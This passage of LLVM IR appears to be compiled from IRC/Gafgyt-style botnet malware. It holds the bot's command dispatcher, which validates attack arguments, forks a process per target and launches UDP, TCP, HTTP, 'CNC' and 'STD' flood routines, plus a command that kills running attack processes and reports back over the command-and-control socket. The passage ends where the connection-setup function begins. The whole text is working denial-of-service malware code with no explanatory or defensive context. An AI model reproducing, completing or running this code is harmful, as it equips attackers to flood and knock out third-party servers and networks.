  %403 = getelementptr inbounds i8*, i8** %402, i64 4
  %404 = load i8*, i8** %403, align 8
  %405 = call i32 @atoi(i8* %404) #10
  %406 = icmp eq i32 %405, -1
  br i1 %406, label %440, label %407

; <label>:407:                                    ; preds = %401
  %408 = load i8**, i8*** %4, align 8
  %409 = getelementptr inbounds i8*, i8** %408, i64 5
  %410 = load i8*, i8** %409, align 8
  %411 = call i32 @atoi(i8* %410) #10
  %412 = icmp eq i32 %411, -1
  br i1 %412, label %440, label %413

; <label>:413:                                    ; preds = %407
  %414 = load i8**, i8*** %4, align 8
  %415 = getelementptr inbounds i8*, i8** %414, i64 5
  %416 = load i8*, i8** %415, align 8
  %417 = call i32 @atoi(i8* %416) #10
  %418 = icmp sgt i32 %417, 65536
  br i1 %418, label %440, label %419

; <label>:419:                                    ; preds = %413
  %420 = load i8**, i8*** %4, align 8
  %421 = getelementptr inbounds i8*, i8** %420, i64 5
  %422 = load i8*, i8** %421, align 8
  %423 = call i32 @atoi(i8* %422) #10
  %424 = icmp sgt i32 %423, 65500
  br i1 %424, label %440, label %425

; <label>:425:                                    ; preds = %419
  %426 = load i8**, i8*** %4, align 8
  %427 = getelementptr inbounds i8*, i8** %426, i64 4
  %428 = load i8*, i8** %427, align 8
  %429 = call i32 @atoi(i8* %428) #10
  %430 = icmp sgt i32 %429, 32
  br i1 %430, label %440, label %431

; <label>:431:                                    ; preds = %425
  %432 = load i32, i32* %3, align 4
  %433 = icmp eq i32 %432, 7
  br i1 %433, label %434, label %441

; <label>:434:                                    ; preds = %431
  %435 = load i8**, i8*** %4, align 8
  %436 = getelementptr inbounds i8*, i8** %435, i64 6
  %437 = load i8*, i8** %436, align 8
  %438 = call i32 @atoi(i8* %437) #10
  %439 = icmp slt i32 %438, 1
  br i1 %439, label %440, label %441

; <label>:440:                                    ; preds = %434, %425, %419, %413, %407, %401, %395, %389, %386
  br label %923

; <label>:441:                                    ; preds = %434, %431
  %442 = load i8**, i8*** %4, align 8
  %443 = getelementptr inbounds i8*, i8** %442, i64 1
  %444 = load i8*, i8** %443, align 8
  store i8* %444, i8** %29, align 8
  %445 = load i8**, i8*** %4, align 8
  %446 = getelementptr inbounds i8*, i8** %445, i64 2
  %447 = load i8*, i8** %446, align 8
  %448 = call i32 @atoi(i8* %447) #10
  store i32 %448, i32* %30, align 4
  %449 = load i8**, i8*** %4, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 3
  %451 = load i8*, i8** %450, align 8
  %452 = call i32 @atoi(i8* %451) #10
  store i32 %452, i32* %31, align 4
  %453 = load i8**, i8*** %4, align 8
  %454 = getelementptr inbounds i8*, i8** %453, i64 4
  %455 = load i8*, i8** %454, align 8
  %456 = call i32 @atoi(i8* %455) #10
  store i32 %456, i32* %32, align 4
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 5
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #10
  store i32 %460, i32* %33, align 4
  %461 = load i32, i32* %3, align 4
  %462 = icmp sgt i32 %461, 6
  br i1 %462, label %463, label %468

; <label>:463:                                    ; preds = %441
  %464 = load i8**, i8*** %4, align 8
  %465 = getelementptr inbounds i8*, i8** %464, i64 6
  %466 = load i8*, i8** %465, align 8
  %467 = call i32 @atoi(i8* %466) #10
  br label %469

; <label>:468:                                    ; preds = %441
  br label %469

; <label>:469:                                    ; preds = %468, %463
  %470 = phi i32 [ %467, %463 ], [ 1000, %468 ]
  store i32 %470, i32* %34, align 4
  %471 = load i32, i32* %3, align 4
  %472 = icmp sgt i32 %471, 7
  br i1 %472, label %473, label %478

; <label>:473:                                    ; preds = %469
  %474 = load i8**, i8*** %4, align 8
  %475 = getelementptr inbounds i8*, i8** %474, i64 7
  %476 = load i8*, i8** %475, align 8
  %477 = call i32 @atoi(i8* %476) #10
  br label %479

; <label>:478:                                    ; preds = %469
  br label %479

; <label>:479:                                    ; preds = %478, %473
  %480 = phi i32 [ %477, %473 ], [ 1000000, %478 ]
  store i32 %480, i32* %35, align 4
  %481 = load i32, i32* %3, align 4
  %482 = icmp sgt i32 %481, 8
  br i1 %482, label %483, label %488

; <label>:483:                                    ; preds = %479
  %484 = load i8**, i8*** %4, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 8
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @atoi(i8* %486) #10
  br label %489

; <label>:488:                                    ; preds = %479
  br label %489

; <label>:489:                                    ; preds = %488, %483
  %490 = phi i32 [ %487, %483 ], [ 0, %488 ]
  store i32 %490, i32* %36, align 4
  %491 = load i8*, i8** %29, align 8
  %492 = call i8* @strstr(i8* %491, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %493 = icmp ne i8* %492, null
  br i1 %493, label %494, label %515

; <label>:494:                                    ; preds = %489
  %495 = load i8*, i8** %29, align 8
  %496 = call i8* @strtok(i8* %495, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %496, i8** %37, align 8
  br label %497

; <label>:497:                                    ; preds = %512, %494
  %498 = load i8*, i8** %37, align 8
  %499 = icmp ne i8* %498, null
  br i1 %499, label %500, label %514

; <label>:500:                                    ; preds = %497
  %501 = call i32 @listFork()
  %502 = icmp ne i32 %501, 0
  br i1 %502, label %512, label %503

; <label>:503:                                    ; preds = %500
  %504 = load i8*, i8** %37, align 8
  %505 = load i32, i32* %30, align 4
  %506 = load i32, i32* %31, align 4
  %507 = load i32, i32* %32, align 4
  %508 = load i32, i32* %33, align 4
  %509 = load i32, i32* %34, align 4
  %510 = load i32, i32* %35, align 4
  %511 = load i32, i32* %36, align 4
  call void @sendUDP(i8* %504, i32 %505, i32 %506, i32 %507, i32 %508, i32 %509, i32 %510, i32 %511)
  call void @_exit(i32 0) #12
  unreachable

; <label>:512:                                    ; preds = %500
  %513 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %513, i8** %37, align 8
  br label %497

; <label>:514:                                    ; preds = %497
  br label %528

; <label>:515:                                    ; preds = %489
  %516 = call i32 @listFork()
  %517 = icmp ne i32 %516, 0
  br i1 %517, label %527, label %518

; <label>:518:                                    ; preds = %515
  %519 = load i8*, i8** %29, align 8
  %520 = load i32, i32* %30, align 4
  %521 = load i32, i32* %31, align 4
  %522 = load i32, i32* %32, align 4
  %523 = load i32, i32* %33, align 4
  %524 = load i32, i32* %34, align 4
  %525 = load i32, i32* %35, align 4
  %526 = load i32, i32* %36, align 4
  call void @sendUDP(i8* %519, i32 %520, i32 %521, i32 %522, i32 %523, i32 %524, i32 %525, i32 %526)
  call void @_exit(i32 0) #12
  unreachable

; <label>:527:                                    ; preds = %515
  br label %528

; <label>:528:                                    ; preds = %527, %514
  br label %923

; <label>:529:                                    ; preds = %380
  %530 = load i8**, i8*** %4, align 8
  %531 = getelementptr inbounds i8*, i8** %530, i64 0
  %532 = load i8*, i8** %531, align 8
  %533 = call i32 @strcmp(i8* %532, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.530, i32 0, i32 0)) #10
  %534 = icmp ne i32 %533, 0
  br i1 %534, label %656, label %535

; <label>:535:                                    ; preds = %529
  %536 = load i32, i32* %3, align 4
  %537 = icmp slt i32 %536, 6
  br i1 %537, label %580, label %538

; <label>:538:                                    ; preds = %535
  %539 = load i8**, i8*** %4, align 8
  %540 = getelementptr inbounds i8*, i8** %539, i64 3
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @atoi(i8* %541) #10
  %543 = icmp eq i32 %542, -1
  br i1 %543, label %580, label %544

; <label>:544:                                    ; preds = %538
  %545 = load i8**, i8*** %4, align 8
  %546 = getelementptr inbounds i8*, i8** %545, i64 2
  %547 = load i8*, i8** %546, align 8
  %548 = call i32 @atoi(i8* %547) #10
  %549 = icmp eq i32 %548, -1
  br i1 %549, label %580, label %550

; <label>:550:                                    ; preds = %544
  %551 = load i8**, i8*** %4, align 8
  %552 = getelementptr inbounds i8*, i8** %551, i64 4
  %553 = load i8*, i8** %552, align 8
  %554 = call i32 @atoi(i8* %553) #10
  %555 = icmp eq i32 %554, -1
  br i1 %555, label %580, label %556

; <label>:556:                                    ; preds = %550
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 4
  %559 = load i8*, i8** %558, align 8
  %560 = call i32 @atoi(i8* %559) #10
  %561 = icmp sgt i32 %560, 32
  br i1 %561, label %580, label %562

; <label>:562:                                    ; preds = %556
  %563 = load i32, i32* %3, align 4
  %564 = icmp sgt i32 %563, 6
  br i1 %564, label %565, label %571

; <label>:565:                                    ; preds = %562
  %566 = load i8**, i8*** %4, align 8
  %567 = getelementptr inbounds i8*, i8** %566, i64 6
  %568 = load i8*, i8** %567, align 8
  %569 = call i32 @atoi(i8* %568) #10
  %570 = icmp slt i32 %569, 0
  br i1 %570, label %580, label %571

; <label>:571:                                    ; preds = %565, %562
  %572 = load i32, i32* %3, align 4
  %573 = icmp eq i32 %572, 8
  br i1 %573, label %574, label %581

; <label>:574:                                    ; preds = %571
  %575 = load i8**, i8*** %4, align 8
  %576 = getelementptr inbounds i8*, i8** %575, i64 7
  %577 = load i8*, i8** %576, align 8
  %578 = call i32 @atoi(i8* %577) #10
  %579 = icmp slt i32 %578, 1
  br i1 %579, label %580, label %581

; <label>:580:                                    ; preds = %574, %565, %556, %550, %544, %538, %535
  br label %923

; <label>:581:                                    ; preds = %574, %571
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 1
  %584 = load i8*, i8** %583, align 8
  store i8* %584, i8** %38, align 8
  %585 = load i8**, i8*** %4, align 8
  %586 = getelementptr inbounds i8*, i8** %585, i64 2
  %587 = load i8*, i8** %586, align 8
  %588 = call i32 @atoi(i8* %587) #10
  store i32 %588, i32* %39, align 4
  %589 = load i8**, i8*** %4, align 8
  %590 = getelementptr inbounds i8*, i8** %589, i64 3
  %591 = load i8*, i8** %590, align 8
  %592 = call i32 @atoi(i8* %591) #10
  store i32 %592, i32* %40, align 4
  %593 = load i8**, i8*** %4, align 8
  %594 = getelementptr inbounds i8*, i8** %593, i64 4
  %595 = load i8*, i8** %594, align 8
  %596 = call i32 @atoi(i8* %595) #10
  store i32 %596, i32* %41, align 4
  %597 = load i8**, i8*** %4, align 8
  %598 = getelementptr inbounds i8*, i8** %597, i64 5
  %599 = load i8*, i8** %598, align 8
  store i8* %599, i8** %42, align 8
  %600 = load i32, i32* %3, align 4
  %601 = icmp eq i32 %600, 8
  br i1 %601, label %602, label %607

; <label>:602:                                    ; preds = %581
  %603 = load i8**, i8*** %4, align 8
  %604 = getelementptr inbounds i8*, i8** %603, i64 7
  %605 = load i8*, i8** %604, align 8
  %606 = call i32 @atoi(i8* %605) #10
  br label %608

; <label>:607:                                    ; preds = %581
  br label %608

; <label>:608:                                    ; preds = %607, %602
  %609 = phi i32 [ %606, %602 ], [ 10, %607 ]
  store i32 %609, i32* %43, align 4
  %610 = load i32, i32* %3, align 4
  %611 = icmp sgt i32 %610, 6
  br i1 %611, label %612, label %617

; <label>:612:                                    ; preds = %608
  %613 = load i8**, i8*** %4, align 8
  %614 = getelementptr inbounds i8*, i8** %613, i64 6
  %615 = load i8*, i8** %614, align 8
  %616 = call i32 @atoi(i8* %615) #10
  br label %618

; <label>:617:                                    ; preds = %608
  br label %618

; <label>:618:                                    ; preds = %617, %612
  %619 = phi i32 [ %616, %612 ], [ 0, %617 ]
  store i32 %619, i32* %44, align 4
  %620 = load i8*, i8** %38, align 8
  %621 = call i8* @strstr(i8* %620, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %622 = icmp ne i8* %621, null
  br i1 %622, label %623, label %643

; <label>:623:                                    ; preds = %618
  %624 = load i8*, i8** %38, align 8
  %625 = call i8* @strtok(i8* %624, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %625, i8** %45, align 8
  br label %626

; <label>:626:                                    ; preds = %640, %623
  %627 = load i8*, i8** %45, align 8
  %628 = icmp ne i8* %627, null
  br i1 %628, label %629, label %642

; <label>:629:                                    ; preds = %626
  %630 = call i32 @listFork()
  %631 = icmp ne i32 %630, 0
  br i1 %631, label %640, label %632

; <label>:632:                                    ; preds = %629
  %633 = load i8*, i8** %45, align 8
  %634 = load i32, i32* %39, align 4
  %635 = load i32, i32* %40, align 4
  %636 = load i32, i32* %41, align 4
  %637 = load i8*, i8** %42, align 8
  %638 = load i32, i32* %44, align 4
  %639 = load i32, i32* %43, align 4
  call void @sendTCP(i8* %633, i32 %634, i32 %635, i32 %636, i8* %637, i32 %638, i32 %639)
  call void @_exit(i32 0) #12
  unreachable

; <label>:640:                                    ; preds = %629
  %641 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %641, i8** %45, align 8
  br label %626

; <label>:642:                                    ; preds = %626
  br label %655

; <label>:643:                                    ; preds = %618
  %644 = call i32 @listFork()
  %645 = icmp ne i32 %644, 0
  br i1 %645, label %654, label %646

; <label>:646:                                    ; preds = %643
  %647 = load i8*, i8** %38, align 8
  %648 = load i32, i32* %39, align 4
  %649 = load i32, i32* %40, align 4
  %650 = load i32, i32* %41, align 4
  %651 = load i8*, i8** %42, align 8
  %652 = load i32, i32* %44, align 4
  %653 = load i32, i32* %43, align 4
  call void @sendTCP(i8* %647, i32 %648, i32 %649, i32 %650, i8* %651, i32 %652, i32 %653)
  call void @_exit(i32 0) #12
  unreachable

; <label>:654:                                    ; preds = %643
  br label %655

; <label>:655:                                    ; preds = %654, %642
  br label %656

; <label>:656:                                    ; preds = %655, %529
  %657 = load i8**, i8*** %4, align 8
  %658 = getelementptr inbounds i8*, i8** %657, i64 0
  %659 = load i8*, i8** %658, align 8
  %660 = call i32 @strcmp(i8* %659, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.531, i32 0, i32 0)) #10
  %661 = icmp ne i32 %660, 0
  br i1 %661, label %737, label %662

; <label>:662:                                    ; preds = %656
  %663 = load i32, i32* %3, align 4
  %664 = icmp slt i32 %663, 6
  br i1 %664, label %665, label %666

; <label>:665:                                    ; preds = %662
  br label %923

; <label>:666:                                    ; preds = %662
  %667 = load i8**, i8*** %4, align 8
  %668 = getelementptr inbounds i8*, i8** %667, i64 1
  %669 = load i8*, i8** %668, align 8
  %670 = call i8* @strstr(i8* %669, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %671 = icmp ne i8* %670, null
  br i1 %671, label %672, label %709

; <label>:672:                                    ; preds = %666
  %673 = load i8**, i8*** %4, align 8
  %674 = getelementptr inbounds i8*, i8** %673, i64 1
  %675 = load i8*, i8** %674, align 8
  %676 = call i8* @strtok(i8* %675, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %676, i8** %46, align 8
  br label %677

; <label>:677:                                    ; preds = %706, %672
  %678 = load i8*, i8** %46, align 8
  %679 = icmp ne i8* %678, null
  br i1 %679, label %680, label %708

; <label>:680:                                    ; preds = %677
  %681 = call i32 @listFork()
  %682 = icmp ne i32 %681, 0
  br i1 %682, label %706, label %683

; <label>:683:                                    ; preds = %680
  %684 = load i8**, i8*** %4, align 8
  %685 = getelementptr inbounds i8*, i8** %684, i64 1
  %686 = load i8*, i8** %685, align 8
  %687 = load i8**, i8*** %4, align 8
  %688 = getelementptr inbounds i8*, i8** %687, i64 2
  %689 = load i8*, i8** %688, align 8
  %690 = load i8**, i8*** %4, align 8
  %691 = getelementptr inbounds i8*, i8** %690, i64 3
  %692 = load i8*, i8** %691, align 8
  %693 = call i32 @atoi(i8* %692) #10
  %694 = trunc i32 %693 to i16
  %695 = load i8**, i8*** %4, align 8
  %696 = getelementptr inbounds i8*, i8** %695, i64 4
  %697 = load i8*, i8** %696, align 8
  %698 = load i8**, i8*** %4, align 8
  %699 = getelementptr inbounds i8*, i8** %698, i64 5
  %700 = load i8*, i8** %699, align 8
  %701 = call i32 @atoi(i8* %700) #10
  %702 = load i8**, i8*** %4, align 8
  %703 = getelementptr inbounds i8*, i8** %702, i64 6
  %704 = load i8*, i8** %703, align 8
  %705 = call i32 @atoi(i8* %704) #10
  call void @sendHTTP(i8* %686, i8* %689, i16 zeroext %694, i8* %697, i32 %701, i32 %705)
  call void @_exit(i32 0) #12
  unreachable

; <label>:706:                                    ; preds = %680
  %707 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %707, i8** %46, align 8
  br label %677

; <label>:708:                                    ; preds = %677
  br label %736

; <label>:709:                                    ; preds = %666
  %710 = call i32 @listFork()
  %711 = icmp ne i32 %710, 0
  br i1 %711, label %712, label %713

; <label>:712:                                    ; preds = %709
  br label %923

; <label>:713:                                    ; preds = %709
  %714 = load i8**, i8*** %4, align 8
  %715 = getelementptr inbounds i8*, i8** %714, i64 1
  %716 = load i8*, i8** %715, align 8
  %717 = load i8**, i8*** %4, align 8
  %718 = getelementptr inbounds i8*, i8** %717, i64 2
  %719 = load i8*, i8** %718, align 8
  %720 = load i8**, i8*** %4, align 8
  %721 = getelementptr inbounds i8*, i8** %720, i64 3
  %722 = load i8*, i8** %721, align 8
  %723 = call i32 @atoi(i8* %722) #10
  %724 = trunc i32 %723 to i16
  %725 = load i8**, i8*** %4, align 8
  %726 = getelementptr inbounds i8*, i8** %725, i64 4
  %727 = load i8*, i8** %726, align 8
  %728 = load i8**, i8*** %4, align 8
  %729 = getelementptr inbounds i8*, i8** %728, i64 5
  %730 = load i8*, i8** %729, align 8
  %731 = call i32 @atoi(i8* %730) #10
  %732 = load i8**, i8*** %4, align 8
  %733 = getelementptr inbounds i8*, i8** %732, i64 6
  %734 = load i8*, i8** %733, align 8
  %735 = call i32 @atoi(i8* %734) #10
  call void @sendHTTP(i8* %716, i8* %719, i16 zeroext %724, i8* %727, i32 %731, i32 %735)
  call void @_exit(i32 0) #12
  unreachable

; <label>:736:                                    ; preds = %708
  br label %737

; <label>:737:                                    ; preds = %736, %656
  %738 = load i8**, i8*** %4, align 8
  %739 = getelementptr inbounds i8*, i8** %738, i64 0
  %740 = load i8*, i8** %739, align 8
  %741 = call i32 @strcmp(i8* %740, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.532, i32 0, i32 0)) #10
  %742 = icmp ne i32 %741, 0
  br i1 %742, label %801, label %743

; <label>:743:                                    ; preds = %737
  %744 = load i32, i32* %3, align 4
  %745 = icmp slt i32 %744, 4
  br i1 %745, label %758, label %746

; <label>:746:                                    ; preds = %743
  %747 = load i8**, i8*** %4, align 8
  %748 = getelementptr inbounds i8*, i8** %747, i64 2
  %749 = load i8*, i8** %748, align 8
  %750 = call i32 @atoi(i8* %749) #10
  %751 = icmp slt i32 %750, 1
  br i1 %751, label %758, label %752

; <label>:752:                                    ; preds = %746
  %753 = load i8**, i8*** %4, align 8
  %754 = getelementptr inbounds i8*, i8** %753, i64 3
  %755 = load i8*, i8** %754, align 8
  %756 = call i32 @atoi(i8* %755) #10
  %757 = icmp slt i32 %756, 1
  br i1 %757, label %758, label %759

; <label>:758:                                    ; preds = %752, %746, %743
  br label %923

; <label>:759:                                    ; preds = %752
  %760 = load i8**, i8*** %4, align 8
  %761 = getelementptr inbounds i8*, i8** %760, i64 1
  %762 = load i8*, i8** %761, align 8
  store i8* %762, i8** %47, align 8
  %763 = load i8**, i8*** %4, align 8
  %764 = getelementptr inbounds i8*, i8** %763, i64 2
  %765 = load i8*, i8** %764, align 8
  %766 = call i32 @atoi(i8* %765) #10
  store i32 %766, i32* %48, align 4
  %767 = load i8**, i8*** %4, align 8
  %768 = getelementptr inbounds i8*, i8** %767, i64 3
  %769 = load i8*, i8** %768, align 8
  %770 = call i32 @atoi(i8* %769) #10
  store i32 %770, i32* %49, align 4
  %771 = load i8*, i8** %47, align 8
  %772 = call i8* @strstr(i8* %771, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %773 = icmp ne i8* %772, null
  br i1 %773, label %774, label %792

; <label>:774:                                    ; preds = %759
  %775 = load i8*, i8** %47, align 8
  %776 = call i8* @strtok(i8* %775, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %776, i8** %50, align 8
  br label %777

; <label>:777:                                    ; preds = %789, %774
  %778 = load i8*, i8** %50, align 8
  %779 = icmp ne i8* %778, null
  br i1 %779, label %780, label %791

; <label>:780:                                    ; preds = %777
  %781 = call i32 @listFork()
  %782 = icmp ne i32 %781, 0
  br i1 %782, label %789, label %783

; <label>:783:                                    ; preds = %780
  %784 = load i8*, i8** %50, align 8
  %785 = load i32, i32* %48, align 4
  %786 = load i32, i32* %49, align 4
  call void @sendCNC(i8* %784, i32 %785, i32 %786)
  %787 = load i32, i32* @mainCommSock, align 4
  %788 = call i32 @close(i32 %787)
  call void @_exit(i32 0) #12
  unreachable

; <label>:789:                                    ; preds = %780
  %790 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %790, i8** %50, align 8
  br label %777

; <label>:791:                                    ; preds = %777
  br label %800

; <label>:792:                                    ; preds = %759
  %793 = call i32 @listFork()
  %794 = icmp ne i32 %793, 0
  br i1 %794, label %795, label %796

; <label>:795:                                    ; preds = %792
  br label %923

; <label>:796:                                    ; preds = %792
  %797 = load i8*, i8** %47, align 8
  %798 = load i32, i32* %48, align 4
  %799 = load i32, i32* %49, align 4
  call void @sendCNC(i8* %797, i32 %798, i32 %799)
  call void @_exit(i32 0) #12
  unreachable

; <label>:800:                                    ; preds = %791
  br label %801

; <label>:801:                                    ; preds = %800, %737
  %802 = load i8**, i8*** %4, align 8
  %803 = getelementptr inbounds i8*, i8** %802, i64 0
  %804 = load i8*, i8** %803, align 8
  %805 = call i32 @strcmp(i8* %804, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.533, i32 0, i32 0)) #10
  %806 = icmp ne i32 %805, 0
  br i1 %806, label %863, label %807

; <label>:807:                                    ; preds = %801
  %808 = load i32, i32* %3, align 4
  %809 = icmp slt i32 %808, 4
  br i1 %809, label %822, label %810

; <label>:810:                                    ; preds = %807
  %811 = load i8**, i8*** %4, align 8
  %812 = getelementptr inbounds i8*, i8** %811, i64 2
  %813 = load i8*, i8** %812, align 8
  %814 = call i32 @atoi(i8* %813) #10
  %815 = icmp slt i32 %814, 1
  br i1 %815, label %822, label %816

; <label>:816:                                    ; preds = %810
  %817 = load i8**, i8*** %4, align 8
  %818 = getelementptr inbounds i8*, i8** %817, i64 3
  %819 = load i8*, i8** %818, align 8
  %820 = call i32 @atoi(i8* %819) #10
  %821 = icmp slt i32 %820, 1
  br i1 %821, label %822, label %823

; <label>:822:                                    ; preds = %816, %810, %807
  br label %923

; <label>:823:                                    ; preds = %816
  %824 = load i8**, i8*** %4, align 8
  %825 = getelementptr inbounds i8*, i8** %824, i64 1
  %826 = load i8*, i8** %825, align 8
  store i8* %826, i8** %51, align 8
  %827 = load i8**, i8*** %4, align 8
  %828 = getelementptr inbounds i8*, i8** %827, i64 2
  %829 = load i8*, i8** %828, align 8
  %830 = call i32 @atoi(i8* %829) #10
  store i32 %830, i32* %52, align 4
  %831 = load i8**, i8*** %4, align 8
  %832 = getelementptr inbounds i8*, i8** %831, i64 3
  %833 = load i8*, i8** %832, align 8
  %834 = call i32 @atoi(i8* %833) #10
  store i32 %834, i32* %53, align 4
  %835 = load i8*, i8** %51, align 8
  %836 = call i8* @strstr(i8* %835, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %837 = icmp ne i8* %836, null
  br i1 %837, label %838, label %854

; <label>:838:                                    ; preds = %823
  %839 = load i8*, i8** %51, align 8
  %840 = call i8* @strtok(i8* %839, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %840, i8** %54, align 8
  br label %841

; <label>:841:                                    ; preds = %851, %838
  %842 = load i8*, i8** %54, align 8
  %843 = icmp ne i8* %842, null
  br i1 %843, label %844, label %853

; <label>:844:                                    ; preds = %841
  %845 = call i32 @listFork()
  %846 = icmp ne i32 %845, 0
  br i1 %846, label %851, label %847

; <label>:847:                                    ; preds = %844
  %848 = load i8*, i8** %54, align 8
  %849 = load i32, i32* %52, align 4
  %850 = load i32, i32* %53, align 4
  call void @sendSTD(i8* %848, i32 %849, i32 %850)
  call void @_exit(i32 0) #12
  unreachable

; <label>:851:                                    ; preds = %844
  %852 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %852, i8** %54, align 8
  br label %841

; <label>:853:                                    ; preds = %841
  br label %862

; <label>:854:                                    ; preds = %823
  %855 = call i32 @listFork()
  %856 = icmp ne i32 %855, 0
  br i1 %856, label %857, label %858

; <label>:857:                                    ; preds = %854
  br label %923

; <label>:858:                                    ; preds = %854
  %859 = load i8*, i8** %51, align 8
  %860 = load i32, i32* %52, align 4
  %861 = load i32, i32* %53, align 4
  call void @sendSTD(i8* %859, i32 %860, i32 %861)
  call void @_exit(i32 0) #12
  unreachable

; <label>:862:                                    ; preds = %853
  br label %863

; <label>:863:                                    ; preds = %862, %801
  %864 = load i8**, i8*** %4, align 8
  %865 = getelementptr inbounds i8*, i8** %864, i64 0
  %866 = load i8*, i8** %865, align 8
  %867 = call i32 @strcmp(i8* %866, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.534, i32 0, i32 0)) #10
  %868 = icmp ne i32 %867, 0
  br i1 %868, label %916, label %869

; <label>:869:                                    ; preds = %863
  store i32 0, i32* %55, align 4
  store i64 0, i64* %56, align 8
  br label %870

; <label>:870:                                    ; preds = %898, %869
  %871 = load i64, i64* %56, align 8
  %872 = load i64, i64* @numpids, align 8
  %873 = icmp ult i64 %871, %872
  br i1 %873, label %874, label %905

; <label>:874:                                    ; preds = %870
  %875 = load i32*, i32** @pids, align 8
  %876 = load i64, i64* %56, align 8
  %877 = getelementptr inbounds i32, i32* %875, i64 %876
  %878 = load i32, i32* %877, align 4
  %879 = icmp ne i32 %878, 0
  br i1 %879, label %880, label %897

; <label>:880:                                    ; preds = %874
  %881 = load i32*, i32** @pids, align 8
  %882 = load i64, i64* %56, align 8
  %883 = getelementptr inbounds i32, i32* %881, i64 %882
  %884 = load i32, i32* %883, align 4
  %885 = call i32 @getpid() #2
  %886 = icmp ne i32 %884, %885
  br i1 %886, label %887, label %897

; <label>:887:                                    ; preds = %880
  %888 = load i32*, i32** @pids, align 8
  %889 = load i64, i64* %56, align 8
  %890 = getelementptr inbounds i32, i32* %888, i64 %889
  %891 = load i32, i32* %890, align 4
  %892 = call i32 @kill(i32 %891, i32 9) #2
  %893 = load i32, i32* %55, align 4
  %894 = sub i32 0, 1
  %895 = sub i32 %893, %894
  %896 = add nsw i32 %893, 1
  store i32 %895, i32* %55, align 4
  br label %897

; <label>:897:                                    ; preds = %887, %880, %874
  br label %898

; <label>:898:                                    ; preds = %897
  %899 = load i64, i64* %56, align 8
  %900 = sub i64 0, %899
  %901 = sub i64 0, 1
  %902 = add i64 %900, %901
  %903 = sub i64 0, %902
  %904 = add i64 %899, 1
  store i64 %903, i64* %56, align 8
  br label %870

; <label>:905:                                    ; preds = %870
  %906 = load i32, i32* %55, align 4
  %907 = icmp sgt i32 %906, 0
  br i1 %907, label %908, label %912

; <label>:908:                                    ; preds = %905
  %909 = load i32, i32* @mainCommSock, align 4
  %910 = load i32, i32* %55, align 4
  %911 = call i32 (i32, i8*, ...) @sockprintf(i32 %909, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.535, i32 0, i32 0), i32 %910)
  br label %915

; <label>:912:                                    ; preds = %905
  %913 = load i32, i32* @mainCommSock, align 4
  %914 = call i32 (i32, i8*, ...) @sockprintf(i32 %913, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.536, i32 0, i32 0))
  br label %915

; <label>:915:                                    ; preds = %912, %908
  br label %916

; <label>:916:                                    ; preds = %915, %863
  %917 = load i8**, i8*** %4, align 8
  %918 = getelementptr inbounds i8*, i8** %917, i64 0
  %919 = load i8*, i8** %918, align 8
  %920 = call i32 @strcmp(i8* %919, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.537, i32 0, i32 0)) #10
  %921 = icmp ne i32 %920, 0
  br i1 %921, label %923, label %922

; <label>:922:                                    ; preds = %916
  call void @exit(i32 0) #14
  unreachable

; <label>:923:                                    ; preds = %916, %857, %822, %795, %758, %712, %665, %580, %528, %440, %356, %324, %292, %260, %228, %196, %164, %148, %117, %112, %107, %92, %76, %69, %62
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

